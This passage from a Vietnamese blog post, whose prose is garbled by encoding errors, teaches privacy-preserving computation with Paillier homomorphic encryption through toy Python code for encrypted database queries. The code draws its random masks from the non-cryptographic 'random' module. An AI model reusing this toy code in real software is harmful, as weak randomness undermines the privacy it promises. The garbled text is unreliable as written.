data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-565" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?resize=27%2C27&#038;ssl=1" alt="boss" width="27" height="27" data-recalc-dims="1" /></a></p>
<p class=""><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?ssl=1"><img data-attachment-id="578" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-8/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?fit=659%2C153&amp;ssl=1" data-orig-size="659,153" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?fit=300%2C70&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?fit=604%2C140&amp;ssl=1" class="alignnone wp-image-578 size-full" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?resize=604%2C140&#038;ssl=1" alt="Untitled" width="604" height="140" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?w=659&amp;ssl=1 659w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?resize=300%2C70&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p class="">VÃ­ dá»¥ giao thá»©c Ä‘Æ¡n giáº£n Alice cÃ³ <strong>publickey</strong> (Ä‘á»ƒ mÃ£ hÃ³a) vÃ  2 sá»‘ tiá»n cá»§a 2 orders mÃ  Bob Ä‘áº·t hÃ ng Ä‘Ã£ Ä‘Æ°á»£c mÃ£ hÃ³a<strong> [a], [b]</strong>. Alice khÃ´ng thá»ƒ giáº£i mÃ£ Ä‘á»ƒ biáº¿t <strong>a, b</strong> nhÆ°ng láº¡i muá»‘n tÃ­nh tá»•ng tiá»n<strong> [a+b]</strong>. Bob á»Ÿ Ä‘Ã¢y cÃ³ <strong>secretkey</strong> cÃ³ kháº£ nÄƒng giáº£i mÃ£ Ä‘á»ƒ tÃ­nh phÃ©p cá»™ng cho Alice nhÆ°ng há»‡ thÃ´ng khÃ´ng muá»‘n Bob biáº¿t Alice Ä‘ang muá»‘n tÃ­nh gÃ¬.</p>
<p class=""><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?ssl=1"><img data-attachment-id="579" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-9/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?fit=724%2C273&amp;ssl=1" data-orig-size="724,273" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?fit=300%2C113&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?fit=604%2C228&amp;ssl=1" class="alignnone size-full wp-image-579" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?resize=604%2C228&#038;ssl=1" alt="Untitled" width="604" height="228" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?w=724&amp;ssl=1 724w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?resize=300%2C113&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p class="">Alice báº±ng viá»‡c sá»­ dá»¥ng random <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_2943eb743cec6d95e34639874f2d6a27.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> khiáº¿n cho Bob khÃ´ng biáº¿t Ä‘Æ°á»ng nÃ o mÃ  láº§n, dÃ¹ anh cÃ³ giáº£i mÃ£ ra a mÅ© vÃ  b ngÃ£ thÃ¬ váº«n khÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c a,b lÃ  gÃ¬. Tuy nhiÃªn cÅ©ng xin lÆ°u Ã½ á»Ÿ Ä‘Ã¢y ráº±ng, Ä‘á»ƒ Ä‘áº£m báº£o giao thá»©c hoáº¡t Ä‘á»™ng ngon thÃ¬Â random cáº§n cÃ³ má»™t Ä‘á»™ dÃ i k bits cáº§n thiáº¿t nhÃ©. LÃºc implement bá»‹ hack thÃ¬ Ä‘á»«ng Ä‘á»• cho chá»¥y khÃ´ng nÃ³i trÆ°á»›cÂ <a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/look_down.png?ssl=1"><img data-attachment-id="580" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/look_down/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/look_down.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="look_down" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/look_down.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/look_down.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-580" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/look_down.png?resize=25%2C25&#038;ssl=1" alt="look_down" width="25" height="25" data-recalc-dims="1" /></a>.</p>
<p class=""><strong>5. VÃ­ dá»¥ á»©ng dá»¥ng</strong></p>
<p class="">Pháº§n nÃ y vá»›i báº¡n Ä‘á»c nÃ o hiá»ƒu rÃµ há»c thuáº­t rá»“i cÃ³ thá»ƒ skip sang luÃ´n pháº§n like subcribe comment vÃ  share trÃªn phÃ¢y bÃºc.Â DÆ°á»›iÂ Ä‘Ã¢y chá»‰ lÃ  bÃ i toÃ¡n vÃ­ dá»¥ Ä‘Æ¡n giáº£n tráº» con sá»­ dá»¥ng Pailler Ä‘á»ƒ báº£o vá»‡ cÃ¡c thÃ´ng tin nhÆ°: tuá»•i, thu nháº­p báº±ng Python.</p>
<p class=""><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?ssl=1"><img data-attachment-id="581" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-10/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?fit=561%2C312&amp;ssl=1" data-orig-size="561,312" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?fit=300%2C167&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?fit=561%2C312&amp;ssl=1" class="alignnone size-full wp-image-581" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?resize=561%2C312&#038;ssl=1" alt="Untitled" width="561" height="312" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?w=561&amp;ssl=1 561w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?resize=300%2C167&amp;ssl=1 300w" sizes="(max-width: 561px) 100vw, 561px" data-recalc-dims="1" /></a></p>
<p class="">Äáº§u tiÃªn, giáº£ sá»­ tÃ´i cÃ³ má»™t há»‡ cÆ¡ sá»Ÿ dá»¯ liá»‡u cáº§n mÃ£ hÃ³a Paillier vá»›i 3 cá»™t: TÃªn, tuá»•i, thu nháº­p. TÃ´i xin Äƒn cáº¯pÂ thÆ° viá»‡nÂ Pure Python Paillier Homomorphic Cryptosystem (3) Ä‘á»ƒ mÃ£ hÃ³a dÆ°á»›i Ä‘Ã¢y:</p>
<pre class="lang:python decode:true">from paillier.paillier import *
from timer import Timer
import random,string

def encrypt_db():
	print "Encrypting...."
	for p in session.query(Person):
		p.age = str(encrypt(pub, int(p.age)))
		p.income = str(encrypt(pub, int(p.income)))
		p.name = str(int(p.name.encode("hex"),16))
	session.commit()

def decrypt_db():
	print "Decrypting...."
	for p in session.query(Person):
		print decrypt(priv, pub, int(p.age)) ,decrypt(priv, pub, int(p.income)) , hex(decrypt(priv, pub, int(p.name ))).replace("0x","").replace("L","")

print "Generating keypair..."
priv, pub =  generate_keypair(2048)
</pre>
<p>Vá»›i quyá»n query lÃªn database toÃ n bá»™ bá»‹ mÃ£ hÃ³a, tÃ´i cÃ³ 2 bÃ i toÃ¡n cáº§n giáº£i quyáº¿t Ä‘Ã³ lÃ :</p>
<ul>
<li>Nháº­p lÃªn má»™t sá»‘ <em>x</em>, yÃªu cáº§u tráº£ lá»i cÃ¢u há»iÂ cÃ³ bao nhiÃªu ngÆ°á»i cÃ³ Ä‘á»™ tuá»•i lá»›n hÆ¡n x mÃ  khÃ´ng lÃ m lá»™ sá»‘ <em>x</em> Ä‘ang Ä‘Æ°á»£c há»i.</li>
<li>TÃ­nh tá»•ng thu nháº­p cá»§a táº¥t cáº£ nhá»¯ng ngÆ°á»i cÃ³ Ä‘á»™ tuá»•iÂ lá»›n hÆ¡n x mÃ  khÃ´ng lÃ m lá»™ thÃ´ng tin thu nháº­p cá»§a tá»«ng ngÆ°á»i.</li>
</ul>
<p>Äá» giáº£i quyáº¿t 2 bÃ i toÃ¡n trÃªn, tÃ´i tham kháº£o giao thá»©c tÃ­nh toÃ¡n khÃ´ng lÃ m lá»™ dá»¯ liá»‡u Ä‘Æ°á»£c cáº£i tiáº¿n cá»§a Zerkin (4) báº¡n tÃ´i nhÆ° sau:</p>
<p><img class="alignnone size-full" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/u.jpg?resize=604%2C958&#038;ssl=1" alt="" width="604" height="958" data-recalc-dims="1" /></p>
<p>HÃ m gá»­i lÃªn Ä‘á»ƒ láº¥y káº¿t quáº£ ta chá»‰ cáº§n quan tÃ¢m tá»›i hÃ m A(pub, enc_a, enc_b). á» Ä‘Ã¢y Ä‘Æ°á»£c code nhÆ° sau (code bá»«a hÆ¡i dÃ i Ä‘á» nghá»‹ khÃ´ng gáº¡ch Ä‘Ã¡ <a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?ssl=1"><img data-attachment-id="586" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/beat_brick/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="beat_brick" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-586" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?resize=27%2C27&#038;ssl=1" alt="beat_brick" width="27" height="27" data-recalc-dims="1" /></a>):</p>
<pre class="lang:python decode:true ">from paillier.paillier import *
import random,string

l=17
def A(pub, enc_a, enc_b):
	enc_z = e_add(pub, e_add(pub, enc_a, encrypt(pub, 2**l)), invmod(enc_b,pub.n_sq))
	r = random.randrange(2**(80+l+1))

	r_bin = bin(r).replace("0b","").replace("L","")
	r_bin = "0"* (l-len(r_bin))+r_bin
	r_bin = r_bin[::-1]
	enc_r = encrypt(pub, r)
	enc_d = e_add(pub, enc_z , enc_r)
	enc_d1, enc_d2 , enc_t = B1(enc_d)
	s = [-1,1][random.randint(0,1)]

	h = [0]*l
	v = [0]*l
	enc_c = [0]*l
	enc_e = [0]*l
	for i in range(l):
		while True:
			h[i] = random.getrandbits(long(round(math.log(pub.n, 2))))
			if h[i] &gt; 0 and h[i] &lt; pub.n and gcd(h[i], pub.n) == 1:
				break

	for i in range(l):
		v[i] = s - int(r_bin[i])
		for j in range(i+1,l):
			v[i] -= (2**j) * int(r_bin[j])
		if v[i] &lt; 0: 
			v[i] = pub.n + v[i]
		enc_c[i] = e_add(pub, encrypt(pub, v[i]), enc_t[i])
		enc_e[i] = pow (enc_c[i], h[i],pub.n_sq)

	enc_lamda = B2(enc_e)
	if s != 1:
		enc_lamda = e_add(pub, encrypt(pub,1), invmod(enc_lamda,pub.n_sq))
	enc_zl = e_add(pub, e_add(pub, enc_d2, invmod(encrypt(pub,(r / 2**l)),pub.n_sq)), invmod(enc_lamda,pub.n_sq))
	return B3(enc_zl)

def B1(enc_d):
	d= decrypt(priv, pub, enc_d)
	d1 = d%(2**l)
	d2 = d/(2**l)
	d_bin = bin(d1).replace("0b","").replace("L","")
	d_bin = "0"* (l-len(d_bin))+d_bin
	d_bin = d_bin[::-1]
	t = [int(0)]*l
	for i in range(l):
		t[i] = int(d_bin[i])
		for j in range(i+1,l):
			t[i] += (2**j) * int(d_bin[j])
		t[i] = encrypt(pub, t[i])
	return encrypt(pub,d1) , encrypt(pub,d2),t
def B2(enc_e):
	e = [int(0)]*l
	for i in range(l):
		e[i] = decrypt(priv, pub, enc_e[i])
		if e[i] ==0: return encrypt(pub,1)
	return encrypt(pub,0)


def B3(enc_zl):
	return decrypt(priv,pub, enc_zl)</pre>
<p>Váº­y vá»›i bÃ i toÃ¡n 1, Ä‘á»ƒ biáº¿t bao ngÆ°á»i cÃ³ sá»‘ tuá»•i tá»« x Ä‘á»• lÃªn ta chá»‰ cáº§n query báº±ng hÃ m A():</p>
<pre class="lang:default decode:true">index = [-1]*len(income)	
for i in range(len(age)):
	enc_x = encrypt(pub, x)
	if int(A(pub, age[i],  enc_x))&gt;0:
		index[number] = i
		number+=1</pre>
<p>Vá»›i bÃ i toÃ¡n 2, Ä‘á»ƒ thÃªm pháº§n báº£o máº­t ta nhÃ©t thÃªm má»™t sá»‘ random r tháº­t dÃ i vÃ o má»—i láº§n query nhÆ° sau:</p>
<pre class="lang:default decode:true">	r = random.randrange(2**(80+32))
	for i in index:
		if i&gt;-1:
			totalincome = e_add(pub, totalincome, income[i])
	totalincome = e_add(pub, totalincome, encrypt(pub,r))
	totalincome = decrypt(priv,pub,totalincome) - r</pre>
<p>Tháº­t lÃ  Ä‘Æ¡n giáº£n pháº£i khÃ´ngÂ <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?ssl=1"><img data-attachment-id="568" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/surrender/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="surrender" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-568" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?resize=25%2C25&#038;ssl=1" alt="surrender" width="25" height="25" data-recalc-dims="1" /></a>, náº¿u báº¡n váº«n chÆ°a hiá»ƒu, xin Ä‘á»«ng liÃªn há»‡ tÃ´i vÃ¬ tÃ´i sáº½ khÃ´ng giáº£i thÃ­ch Ä‘Ã¢u. Xin má»i báº¡n Ä‘á»c pháº§n appendix nhÃ©.</p>
<ol>
<li>"Protocols for secure computations". <i>FOCS</i>. 23rd Annual Symposium on Foundations of Computer Science (FOCS 1982): 160â€“164.<a title="Digital object identifier" href="https://en.wikipedia.org/wiki/Digital_object_identifier">doi</a>:<a class="external text" href="https://dx.doi.org/10.1109%2FSFCS.1982.88" rel="nofollow">10.1109/SFCS.1982.88</a></li>
<li>MÃ£ hoÃ¡ Ä‘á»“ng cáº¥u vÃ  á»©ng dá»¥ngÂ http://tapchi.vnu.edu.vn/tckh/news/?1887/635/Ma-hoa-dong-cau-va-ung-dung.htm</li>
<li>https://github.com/mikeivanov/paillier</li>
<li>Z. Erkin, M. Franz, J. Guajardo, S. Katzenbeisser, R. L. Lagendijk and T. Toft, Privacy- Preserving Face Recognition, 9th International Symposium on Privacy Enhancing Technologies, LNCS 5672, pp. 235-253, August 2009.</li>
</ol>
<h1>Appendix:</h1>
<p><strong>á»¨ng dá»¥ng há»‡ mÃ£ hÃ³a Ä‘á»“ng cáº¥u trong nháº­n dáº¡ng hÃ¬nh áº£nh tá»™i pháº¡m</strong> (váº«n Ä‘áº£m báº£o quyá»n báº£o vá»‡ há»‡ thá»‘ng hÃ¬nh áº£nh tá»™i pháº¡m, cÅ©ng nhÆ° khÃ´ng lÃ m lá»™ khuÃ´n máº·t ngÆ°á»i cáº§n kiá»ƒm tra):</p>
<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?ssl=1"><img data-attachment-id="582" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-11/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?fit=790%2C1496&amp;ssl=1" data-orig-size="790,1496" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?fit=158%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?fit=541%2C1024&amp;ssl=1" class="alignnone size-full wp-image-582" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?resize=604%2C1144&#038;ssl=1" alt="Untitled" width="604" height="1144" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?w=790&amp;ssl=1 790w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?resize=158%2C300&amp;ssl=1 158w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?resize=768%2C1454&amp;ssl=1 768w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?resize=541%2C1024&amp;ssl=1 541w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p><strong>TÃ­nh toÃ¡n khÃ´ng lá»™ thÃ´ng tin (ghi chÃº pháº§n 4)</strong></p>
<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?ssl=1"><img data-attachment-id="583" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/av2/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?fit=1417%2C2169&amp;ssl=1" data-orig-size="1417,2169" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="av2" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?fit=196%2C300&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?fit=604%2C925&amp;ssl=1" class="alignnone size-full wp-image-583" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?resize=604%2C925&#038;ssl=1" alt="av2" width="604" height="925" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?w=1417&amp;ssl=1 1417w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?resize=196%2C300&amp;ssl=1 196w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?resize=768%2C1176&amp;ssl=1 768w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?resize=669%2C1024&amp;ssl=1 669w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?w=1208&amp;ssl=1 1208w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?ssl=1"><img data-attachment-id="584" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-12/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?fit=558%2C158&amp;ssl=1" data-orig-size="558,158" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?fit=300%2C85&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?fit=558%2C158&amp;ssl=1" class="alignnone size-full wp-image-584" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?resize=558%2C158&#038;ssl=1" alt="Untitled" width="558" height="158" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?w=558&amp;ssl=1 558w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?resize=300%2C85&amp;ssl=1 300w" sizes="(max-width: 558px) 100vw, 558px" data-recalc-dims="1" /></a></p>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">557</post-id>	</item>
	</channel>
</rss>
